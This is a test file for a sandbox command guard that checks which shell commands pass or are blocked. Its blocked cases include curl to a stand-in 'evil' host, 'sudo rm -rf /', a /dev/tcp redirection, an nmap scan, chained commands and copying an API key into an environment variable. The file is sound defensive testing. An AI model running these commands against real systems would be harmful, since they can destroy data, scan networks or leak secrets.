import { checkCommand } from "@/lib/sandbox-command-guard";

describe("checkCommand", () => {
  it("allows plain ls", () => {
    expect(checkCommand("ls -la").ok).toBe(true);
  });

  it("allows npm install", () => {
    expect(checkCommand("npm install react").ok).toBe(true);
  });

  it("blocks curl", () => {
    expect(checkCommand("curl https://evil.example").ok).toBe(false);
  });

  it("blocks wget", () => {
    expect(checkCommand("wget http://x").ok).toBe(false);
  });

  it("blocks ssh", () => {
    expect(checkCommand("ssh user@host").ok).toBe(false);
  });

  it("blocks sudo", () => {
    expect(checkCommand("sudo rm -rf /").ok).toBe(false);
  });

  it("blocks /dev/tcp redirection", () => {
    expect(checkCommand("bash -c 'echo x > /dev/tcp/1.2.3.4/80'").ok).toBe(
      false
    );
  });

  it("blocks unknown binaries", () => {
    expect(checkCommand("nmap -sS 10.0.0.0/24").ok).toBe(false);
  });

  it("blocks chained commands with a disallowed binary", () => {
    expect(checkCommand("ls && curl evil").ok).toBe(false);
  });

  it("rejects empty commands", () => {
    expect(checkCommand("").ok).toBe(false);
    expect(checkCommand("   ").ok).toBe(false);
  });

  it("rejects commands with env exfil", () => {
    expect(checkCommand("export FOO=$OPENAI_API_KEY").ok).toBe(false);
  });

  it("caps command length", () => {
    expect(checkCommand("ls " + "a".repeat(5000)).ok).toBe(false);
  });
});
